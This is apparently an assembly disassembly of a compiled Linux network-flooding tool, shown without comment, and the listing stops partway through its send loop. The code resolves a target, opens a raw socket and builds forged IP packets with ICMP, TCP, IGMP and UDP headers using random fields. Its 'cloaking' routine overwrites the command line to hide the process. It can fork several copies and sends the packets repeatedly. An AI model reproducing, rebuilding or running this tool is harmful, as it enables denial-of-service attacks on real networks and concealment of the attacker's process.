push   ebp
mov    ebp,esp
push   ebx
call   804862d <_init+0x9>
pop    ebx
add    ebx,0x2707
cmp    DWORD PTR [ebx+0x70],0x0
je     8048642 <_init+0x1e>
call   0 <_init-0x8048624>
mov    esi,esi
call   8048868 <frame_dummy>
call   8049988 <__do_global_ctors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   DWORD PTR ds:0x804ad38
jmp    DWORD PTR ds:0x804ad3c
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804ad40
push   0x0
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad44
push   0x8
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad48
push   0x10
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad4c
push   0x18
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad50
push   0x20
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad54
push   0x28
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad58
push   0x30
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad5c
push   0x38
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad60
push   0x40
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad64
push   0x48
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad68
push   0x50
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad6c
push   0x58
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad70
push   0x60
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad74
push   0x68
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad78
push   0x70
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad7c
push   0x78
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad80
push   0x80
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad84
push   0x88
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad88
push   0x90
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad8c
push   0x98
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad90
push   0xa0
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad94
push   0xa8
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad98
push   0xb0
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ad9c
push   0xb8
jmp    8048654 <.plt>
jmp    DWORD PTR ds:0x804ada0
push   0xc0
jmp    8048654 <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff8
push   eax
push   esp
push   edx
push   0x80499b8
push   0x8048624
push   ecx
push   esi
push   0x8049114
call   8048714 <__libc_start_main@plt>
hlt    
nop
nop
push   ebp
mov    ebp,esp
cmp    DWORD PTR ds:0x804ac48,0x0
jne    804885c <__do_global_dtors_aux+0x44>
jmp    8048835 <__do_global_dtors_aux+0x1d>
mov    esi,esi
lea    edx,[eax+0x4]
mov    DWORD PTR ds:0x804ac44,edx
mov    eax,DWORD PTR [eax]
call   eax
mov    eax,ds:0x804ac44
cmp    DWORD PTR [eax],0x0
jne    8048828 <__do_global_dtors_aux+0x10>
mov    eax,0x80486d4
test   eax,eax
je     8048852 <__do_global_dtors_aux+0x3a>
push   0x804ad20
call   80486d4 <__deregister_frame_info@plt>
mov    DWORD PTR ds:0x804ac48,0x1
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
mov    eax,0x8048664
test   eax,eax
je     8048883 <frame_dummy+0x1b>
push   0x804ae50
push   0x804ad20
call   8048664 <__register_frame_info@plt>
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   0x8049a00
push   0x8049a08
push   0x8049a12
call   8048724 <printf@plt>
add    esp,0xc
leave  
ret    
push   ebp
mov    ebp,esp
mov    eax,DWORD PTR [ebp+0x8]
push   eax
push   0x8049a2c
push   0x8049a34
push   0x8049a08
push   0x8049a40
call   8048724 <printf@plt>
add    esp,0x14
push   0x0
call   8048774 <exit@plt>
add    esp,0x4
lea    esi,[esi+0x0]
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x4
push   0x10
push   0x0
push   0x804aec0
call   80487a4 <memset@plt>
add    esp,0xc
mov    WORD PTR ds:0x804aec0,0x2
mov    eax,ds:0x804aed4
push   eax
call   8048704 <inet_addr@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804aec4,eax
cmp    DWORD PTR ds:0x804aec4,0xffffffff
jne    804897f <resolvedest+0x9f>
mov    eax,ds:0x804aed4
push   eax
call   8048764 <gethostbyname@plt>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8048954 <resolvedest+0x74>
mov    eax,ds:0x804aed4
push   eax
push   0x8049a71
call   8048724 <printf@plt>
add    esp,0x8
push   0x1
call   8048774 <exit@plt>
add    esp,0x4
mov    eax,DWORD PTR [ebp-0x4]
mov    dx,WORD PTR [eax+0x8]
mov    WORD PTR ds:0x804aec0,dx
mov    eax,DWORD PTR [ebp-0x4]
mov    edx,DWORD PTR [eax+0xc]
push   edx
mov    eax,DWORD PTR [ebp-0x4]
mov    edx,DWORD PTR [eax+0x10]
mov    eax,DWORD PTR [edx]
push   eax
push   0x804aec4
call   8048744 <memcpy@plt>
add    esp,0xc
push   0x4
push   0x804aec4
push   0x804ae80
call   8048744 <memcpy@plt>
add    esp,0xc
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x4
nop
nop
push   0x8049a8c
mov    eax,DWORD PTR [ebp+0xc]
push   eax
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   80486e4 <getopt@plt>
add    esp,0xc
mov    eax,eax
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0xffffffff
jne    80489c8 <parse_args+0x30>
jmp    8048a60 <parse_args+0xc8>
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x4]
cmp    eax,0x6e
je     8048a1c <parse_args+0x84>
cmp    eax,0x6e
jg     80489dc <parse_args+0x44>
cmp    eax,0x66
je     8048a34 <parse_args+0x9c>
jmp    8048a4c <parse_args+0xb4>
cmp    eax,0x78
je     80489e4 <parse_args+0x4c>
jmp    8048a4c <parse_args+0xb4>
nop
mov    eax,ds:0x804ae48
push   eax
call   80486f4 <strlen@plt>
add    esp,0x4
mov    eax,eax
push   eax
call   80486b4 <malloc@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804ae90,eax
mov    eax,ds:0x804ae48
push   eax
mov    eax,ds:0x804ae90
push   eax
call   80487e4 <strcpy@plt>
add    esp,0x8
jmp    8048a5a <parse_args+0xc2>
mov    esi,esi
mov    eax,ds:0x804ae48
push   eax
call   8048784 <atoi@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804ac6c,eax
jmp    8048a5a <parse_args+0xc2>
nop
mov    eax,ds:0x804ae48
push   eax
call   8048784 <atoi@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804ac74,eax
jmp    8048a5a <parse_args+0xc2>
nop
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax]
push   edx
call   80488ac <usage>
add    esp,0x4
jmp    80489a0 <parse_args+0x8>
nop
cmp    DWORD PTR ds:0x804ae90,0x0
jne    8048a73 <parse_args+0xdb>
mov    DWORD PTR ds:0x804ae90,0x8049a93
cmp    DWORD PTR ds:0x804ac74,0x0
jne    8048a86 <parse_args+0xee>
mov    DWORD PTR ds:0x804ac74,0x0
mov    eax,ds:0x804ae4c
lea    edx,[eax*4+0x0]
mov    eax,DWORD PTR [ebp+0xc]
cmp    DWORD PTR [eax+edx*1],0x0
jne    8048acc <parse_args+0x134>
push   0x8049a9b
push   0x8049aa2
push   0x8049aaa
push   0x8049ab2
push   0x8049aaa
push   0x8049ac0
call   8048724 <printf@plt>
add    esp,0x18
push   0x1
call   8048774 <exit@plt>
add    esp,0x4
nop
mov    eax,ds:0x804ae4c
lea    edx,[eax*4+0x0]
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax+edx*1]
push   edx
call   80486f4 <strlen@plt>
add    esp,0x4
mov    eax,eax
push   eax
call   80486b4 <malloc@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804aed4,eax
cmp    DWORD PTR ds:0x804aed4,0x0
jne    8048b40 <parse_args+0x1a8>
push   0x8049a9b
push   0x8049aa2
push   0x8049aaa
push   0x8049ab2
push   0x8049aaa
push   0x8049b00
call   8048724 <printf@plt>
add    esp,0x18
push   0x8049b47
call   8048674 <perror@plt>
add    esp,0x4
push   0x1
call   8048774 <exit@plt>
add    esp,0x4
nop
mov    eax,ds:0x804ae4c
lea    edx,[eax*4+0x0]
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax+edx*1]
push   edx
mov    eax,ds:0x804aed4
push   eax
call   80487e4 <strcpy@plt>
add    esp,0x8
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
dec    ebx
test   ebx,ebx
jge    8048b74 <cloaking+0x10>
jmp    8048ba8 <cloaking+0x44>
mov    esi,esi
lea    eax,[ebx*4+0x0]
mov    edx,DWORD PTR [ebp+0xc]
mov    eax,DWORD PTR [edx+eax*1]
push   eax
call   80486f4 <strlen@plt>
add    esp,0x4
mov    eax,eax
push   eax
push   0x0
lea    eax,[ebx*4+0x0]
mov    edx,DWORD PTR [ebp+0xc]
mov    eax,DWORD PTR [edx+eax*1]
push   eax
call   80487a4 <memset@plt>
add    esp,0xc
dec    ebx
jmp    8048b6c <cloaking+0x8>
mov    eax,ds:0x804ae90
push   eax
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax]
push   edx
call   80487e4 <strcpy@plt>
add    esp,0x8
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
mov    ecx,DWORD PTR ds:0x804ac7c
add    ecx,0x1c
mov    DWORD PTR ds:0x804aebc,ecx
mov    eax,ds:0x804aebc
push   eax
call   80486b4 <malloc@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804ae9c,eax
mov    eax,ds:0x804ae9c
mov    ds:0x804aea0,eax
mov    ecx,DWORD PTR ds:0x804ae9c
add    ecx,0x14
mov    DWORD PTR ds:0x804ae70,ecx
mov    eax,ds:0x804aebc
push   eax
push   0x0
mov    eax,ds:0x804ae9c
push   eax
call   80487a4 <memset@plt>
add    esp,0xc
mov    ecx,DWORD PTR ds:0x804ac7c
add    ecx,0x1c
mov    DWORD PTR ds:0x804aeb4,ecx
mov    eax,ds:0x804aeb4
push   eax
call   80486b4 <malloc@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804ae98,eax
mov    eax,ds:0x804ae98
mov    ds:0x804ae7c,eax
mov    ecx,DWORD PTR ds:0x804ae98
add    ecx,0x14
mov    DWORD PTR ds:0x804ae84,ecx
mov    eax,ds:0x804aeb4
push   eax
push   0x0
mov    eax,ds:0x804ae98
push   eax
call   80487a4 <memset@plt>
add    esp,0xc
mov    ecx,DWORD PTR ds:0x804ac7c
add    ecx,0x1c
mov    DWORD PTR ds:0x804ae74,ecx
mov    eax,ds:0x804ae74
push   eax
call   80486b4 <malloc@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804aed0,eax
mov    eax,ds:0x804aed0
mov    ds:0x804aea4,eax
mov    ecx,DWORD PTR ds:0x804aed0
add    ecx,0x14
mov    DWORD PTR ds:0x804ae68,ecx
mov    eax,ds:0x804ae74
push   eax
push   0x0
mov    eax,ds:0x804aed0
push   eax
call   80487a4 <memset@plt>
add    esp,0xc
mov    ecx,DWORD PTR ds:0x804ac7c
add    ecx,0x1c
mov    DWORD PTR ds:0x804aeb8,ecx
mov    eax,ds:0x804aeb8
push   eax
call   80486b4 <malloc@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804aea8,eax
mov    eax,ds:0x804aea8
mov    ds:0x804ae78,eax
mov    ecx,DWORD PTR ds:0x804aea8
add    ecx,0x14
mov    DWORD PTR ds:0x804ae94,ecx
mov    eax,ds:0x804aeb8
push   eax
push   0x0
mov    eax,ds:0x804aea8
push   eax
call   80487a4 <memset@plt>
add    esp,0xc
mov    ecx,DWORD PTR ds:0x804ac78
add    ecx,0x28
mov    DWORD PTR ds:0x804aeb0,ecx
mov    eax,ds:0x804aeb0
push   eax
call   80486b4 <malloc@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804ae88,eax
mov    eax,ds:0x804ae88
mov    ds:0x804ae8c,eax
mov    ecx,DWORD PTR ds:0x804ae88
add    ecx,0x14
mov    DWORD PTR ds:0x804aeac,ecx
mov    eax,ds:0x804aeb0
push   eax
push   0x0
mov    eax,ds:0x804ae88
push   eax
call   80487a4 <memset@plt>
add    esp,0xc
mov    eax,ds:0x804aea0
mov    edx,DWORD PTR ds:0x804ae80
mov    DWORD PTR [eax+0x10],edx
mov    eax,ds:0x804aea0
and    BYTE PTR [eax],0xf
or     BYTE PTR [eax],0x40
push   0x2000
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804aea0
mov    WORD PTR [edx+0x6],ax
mov    eax,ds:0x804aea0
and    BYTE PTR [eax],0xf0
or     BYTE PTR [eax],0x5
mov    eax,ds:0x804aea0
mov    BYTE PTR [eax+0x8],0xff
mov    eax,ds:0x804aea0
mov    BYTE PTR [eax+0x9],0x1
push   0xe0
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804aea0
mov    BYTE PTR [edx+0x1],al
movzx  eax,WORD PTR ds:0x804aebc
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804aea0
mov    WORD PTR [edx+0x2],ax
mov    eax,ds:0x804aea0
mov    WORD PTR [eax+0xa],0x0
mov    eax,ds:0x804ae70
mov    BYTE PTR [eax+0x1],0x0
mov    ax,ds:0x804aebc
mov    dx,WORD PTR ds:0x804ac78
add    eax,edx
movzx  edx,ax
push   edx
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae70
mov    WORD PTR [edx+0x2],ax
mov    eax,ds:0x804ae8c
mov    edx,DWORD PTR ds:0x804ae80
mov    DWORD PTR [eax+0x10],edx
mov    eax,ds:0x804ae8c
and    BYTE PTR [eax],0xf
or     BYTE PTR [eax],0x40
push   0x2000
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae8c
mov    WORD PTR [edx+0x6],ax
mov    eax,ds:0x804ae8c
and    BYTE PTR [eax],0xf0
or     BYTE PTR [eax],0x5
mov    eax,ds:0x804ae8c
mov    BYTE PTR [eax+0x8],0xff
mov    eax,ds:0x804ae8c
mov    BYTE PTR [eax+0x9],0x6
push   0xe0
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae8c
mov    BYTE PTR [edx+0x1],al
movzx  eax,WORD PTR ds:0x804aeb0
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae8c
mov    WORD PTR [edx+0x2],ax
mov    eax,ds:0x804ae8c
mov    WORD PTR [eax+0xa],0x0
mov    eax,ds:0x804aeac
mov    BYTE PTR [eax+0xd],0x2
push   0xffff
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804aeac
mov    WORD PTR [edx+0xe],ax
movzx  eax,WORD PTR ds:0x804aeb0
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804aeac
mov    WORD PTR [edx+0x10],ax
mov    eax,ds:0x804aea4
mov    edx,DWORD PTR ds:0x804ae80
mov    DWORD PTR [eax+0x10],edx
mov    eax,ds:0x804aea4
and    BYTE PTR [eax],0xf
or     BYTE PTR [eax],0x40
push   0x2000
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804aea4
mov    WORD PTR [edx+0x6],ax
mov    eax,ds:0x804aea4
and    BYTE PTR [eax],0xf0
or     BYTE PTR [eax],0x5
mov    eax,ds:0x804aea4
mov    BYTE PTR [eax+0x8],0xff
mov    eax,ds:0x804aea4
mov    BYTE PTR [eax+0x9],0x2
push   0xe0
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804aea4
mov    BYTE PTR [edx+0x1],al
movzx  eax,WORD PTR ds:0x804ae74
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804aea4
mov    WORD PTR [edx+0x2],ax
mov    eax,ds:0x804aea4
mov    WORD PTR [eax+0xa],0x0
mov    eax,ds:0x804ae68
mov    BYTE PTR [eax],0x11
mov    eax,ds:0x804ae68
mov    BYTE PTR [eax+0x1],0x0
movzx  eax,WORD PTR ds:0x804ae74
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae68
mov    WORD PTR [edx+0x2],ax
mov    eax,ds:0x804ae78
mov    edx,DWORD PTR ds:0x804ae80
mov    DWORD PTR [eax+0x10],edx
mov    eax,ds:0x804ae78
and    BYTE PTR [eax],0xf
or     BYTE PTR [eax],0x40
push   0x2000
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae78
mov    WORD PTR [edx+0x6],ax
mov    eax,ds:0x804ae78
and    BYTE PTR [eax],0xf0
or     BYTE PTR [eax],0x5
mov    eax,ds:0x804ae78
mov    BYTE PTR [eax+0x8],0xff
mov    eax,ds:0x804ae78
mov    BYTE PTR [eax+0x9],0x1
push   0xe0
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae78
mov    BYTE PTR [edx+0x1],al
movzx  eax,WORD PTR ds:0x804aeb8
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae78
mov    WORD PTR [edx+0x2],ax
mov    eax,ds:0x804ae78
mov    WORD PTR [eax+0xa],0x0
mov    eax,ds:0x804ae94
mov    BYTE PTR [eax],0x3
mov    ax,ds:0x804aeb8
mov    dx,WORD PTR ds:0x804ac7c
add    eax,edx
movzx  edx,ax
push   edx
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae94
mov    WORD PTR [edx+0x2],ax
mov    eax,ds:0x804ae7c
mov    edx,DWORD PTR ds:0x804ae80
mov    DWORD PTR [eax+0x10],edx
mov    eax,ds:0x804ae7c
and    BYTE PTR [eax],0xf
or     BYTE PTR [eax],0x40
push   0x2000
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae7c
mov    WORD PTR [edx+0x6],ax
mov    eax,ds:0x804ae7c
and    BYTE PTR [eax],0xf0
or     BYTE PTR [eax],0x5
mov    eax,ds:0x804ae7c
mov    BYTE PTR [eax+0x8],0xff
mov    eax,ds:0x804ae7c
mov    BYTE PTR [eax+0x9],0x11
push   0xe0
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae7c
mov    BYTE PTR [edx+0x1],al
movzx  eax,WORD PTR ds:0x804aeb4
push   eax
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae7c
mov    WORD PTR [edx+0x2],ax
mov    eax,ds:0x804ae7c
mov    WORD PTR [eax+0xa],0x0
push   0x8
call   8048794 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR ds:0x804ae84
mov    WORD PTR [edx+0x4],ax
xor    eax,eax
jmp    8049110 <Setup_Packets+0x54c>
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x2c
push   edi
push   esi
push   ebx
xor    edi,edi
push   0xff
push   0x3
push   0x2
call   80487b4 <socket@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x28],eax
mov    eax,DWORD PTR [ebp-0x28]
mov    ds:0x804ae6c,eax
cmp    DWORD PTR ds:0x804ae6c,0x0
jge    804915c <main+0x48>
push   0x8049b4e
call   8048674 <perror@plt>
add    esp,0x4
push   0x1
call   8048774 <exit@plt>
add    esp,0x4
nop
call   8048754 <getgid@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   80486a4 <setgid@plt>
add    esp,0x4
call   8048734 <getuid@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   80487d4 <setuid@plt>
add    esp,0x4
cmp    DWORD PTR [ebp+0x8],0x1
jg     80491a4 <main+0x90>
mov    edx,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ebp-0x2c],eax
mov    edx,DWORD PTR [ebp-0x2c]
push   edx
call   80488ac <usage>
add    esp,0x4
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   8048998 <parse_args>
add    esp,0x8
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   8048b64 <cloaking>
add    esp,0x8
call   80488e0 <resolvedest>
cmp    DWORD PTR ds:0x804ac74,0x0
je     804933c <main+0x228>
call   8048684 <fork@plt>
mov    DWORD PTR [ebp-0x28],eax
cmp    DWORD PTR [ebp-0x28],0xffffffff
je     8049204 <main+0xf0>
cmp    DWORD PTR [ebp-0x28],0x0
je     804925c <main+0x148>
jmp    8049264 <main+0x150>
push   0x8049a9b
push   0x8049aa2
push   0x8049aaa
push   0x8049ab2
push   0x8049aaa
push   0x8049b60
call   8048724 <printf@plt>
add    esp,0x18
push   0x8049a9b
push   0x8049aa2
push   0x8049aaa
push   0x8049ab2
push   0x8049aaa
push   0x8049ba0
call   8048724 <printf@plt>
add    esp,0x18
push   0x1
call   8048774 <exit@plt>
add    esp,0x4
mov    esi,esi
jmp    804933c <main+0x228>
lea    esi,[esi+0x0]
dec    DWORD PTR ds:0x804ac74
xor    ebx,ebx
cmp    ebx,DWORD PTR ds:0x804ac74
jl     804927c <main+0x168>
jmp    804933c <main+0x228>
lea    esi,[esi+0x0]
call   8048684 <fork@plt>
mov    DWORD PTR [ebp-0x28],eax
cmp    DWORD PTR [ebp-0x28],0xffffffff
je     8049294 <main+0x180>
cmp    DWORD PTR [ebp-0x28],0x0
je     80492ec <main+0x1d8>
jmp    80492f4 <main+0x1e0>
mov    esi,esi
push   0x8049a9b
push   0x8049aa2
push   0x8049aaa
push   0x8049ab2
push   0x8049aaa
push   0x8049be0
call   8048724 <printf@plt>
add    esp,0x18
push   0x8049a9b
push   0x8049aa2
push   0x8049aaa
push   0x8049ab2
push   0x8049aaa
push   0x8049ba0
call   8048724 <printf@plt>
add    esp,0x18
push   0x1
call   8048774 <exit@plt>
add    esp,0x4
mov    esi,esi
mov    ebx,DWORD PTR ds:0x804ac74
jmp    8049334 <main+0x220>
mov    eax,ds:0x804ac74
dec    eax
mov    DWORD PTR [ebp-0x28],eax
cmp    ebx,DWORD PTR [ebp-0x28]
jne    8049334 <main+0x220>
push   0x8049a9b
push   0x8049aa2
push   0x8049aaa
push   0x8049ab2
push   0x8049aaa
push   0x8049c00
call   8048724 <printf@plt>
add    esp,0x18
push   0x0
call   8048774 <exit@plt>
add    esp,0x4
mov    esi,esi
inc    ebx
jmp    804926c <main+0x158>
mov    esi,esi
cmp    DWORD PTR ds:0x804ac6c,0x0
jne    804934c <main+0x238>
inc    edi
inc    DWORD PTR ds:0x804ac6c
call   8048bc4 <Setup_Packets>
call   8048890 <banner>
xor    esi,esi
cmp    esi,DWORD PTR ds:0x804ac6c
jl     8049368 <main+0x254>
jmp    8049980 <main+0x86c>
lea    esi,[esi+0x0]
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   8048694 <htonl@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x28],eax
mov    eax,ds:0x804aea0
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,DWORD PTR [ebp-0x28]
mov    edx,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [edx+0xc],eax
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR ds:0x804aea0
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    WORD PTR [eax+0x4],dx
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,ds:0x804ae70
mov    DWORD PTR [ebp-0x28],eax
mov    DWORD PTR [ebp-0x8],0x66666667
mov    eax,DWORD PTR [ebp-0x8]
imul   DWORD PTR [ebp-0x2c]
mov    ecx,edx
mov    eax,ecx
sar    eax,0x2
mov    DWORD PTR [ebp-0xc],eax
mov    ecx,DWORD PTR [ebp-0x2c]
sar    ecx,0x1f
mov    edx,DWORD PTR [ebp-0xc]
sub    edx,ecx
mov    DWORD PTR [ebp-0x4],edx
mov    ecx,DWORD PTR [ebp-0x4]
shl    ecx,0x2
add    ecx,DWORD PTR [ebp-0x4]
lea    eax,[ecx*2+0x0]
mov    DWORD PTR [ebp-0x10],eax
mov    edx,DWORD PTR [ebp-0x2c]
sub    edx,DWORD PTR [ebp-0x10]
mov    DWORD PTR [ebp-0x2c],edx
mov    eax,DWORD PTR [ebp-0x2c]
lea    ecx,[eax*4+0x0]
mov    DWORD PTR [ebp-0x2c],0x804aca0
mov    edx,DWORD PTR [ebp-0x2c]
mov    cl,BYTE PTR [ecx+edx*1]
mov    eax,DWORD PTR [ebp-0x28]
mov    BYTE PTR [eax],cl
push   0x10
mov    DWORD PTR [ebp-0x28],0x804aec0
mov    edx,DWORD PTR [ebp-0x28]
push   edx
push   0x0
mov    eax,ds:0x804aebc
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR ds:0x804ac78
mov    DWORD PTR [ebp-0x2c],edx
mov    eax,DWORD PTR [ebp-0x28]
add    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
mov    eax,ds:0x804ae9c
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
mov    eax,ds:0x804ae6c
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   80486c4 <sendto@plt>
add    esp,0x18
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048694 <htonl@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR ds:0x804aea4
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [eax+0xc],edx
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    eax,ds:0x804aea4
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,DWORD PTR [ebp-0x28]
mov    edx,DWORD PTR [ebp-0x2c]
mov    WORD PTR [edx+0x4],ax
call   80487c4 <rand@plt>
mov    DWORD PTR [ebp-0x28],eax
mov    edx,DWORD PTR [ebp-0x28]
push   edx
call   8048694 <htonl@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x28],eax
mov    eax,ds:0x804ae68
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,DWORD PTR [ebp-0x28]
mov    edx,DWORD PTR [ebp-0x2c]
mov    DWORD PTR [edx+0x4],eax
push   0x1c
call   8048794 <htons@plt>
add    esp,0x4
mov    WORD PTR [ebp-0x28],ax
mov    edx,DWORD PTR ds:0x804ae68
mov    DWORD PTR [ebp-0x2c],edx
mov    edx,DWORD PTR [ebp-0x28]
mov    eax,DWORD PTR [ebp-0x2c]
mov    WORD PTR [eax+0x2],dx
push   0x10
mov    DWORD PTR [ebp-0x28],0x804aec0
mov    eax,DWORD PTR [ebp-0x28]
push   eax
push   0x0
mov    edx,DWORD PTR ds:0x804ae74
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
mov    edx,DWORD PTR ds:0x804aed0
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
mov    edx,DWORD PTR ds:0x804ae6c
mov    DWORD PTR [ebp-0x28],edx
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   80486c4 <sendto@plt>
add    esp,0x18
call   80487c4 <rand@plt>
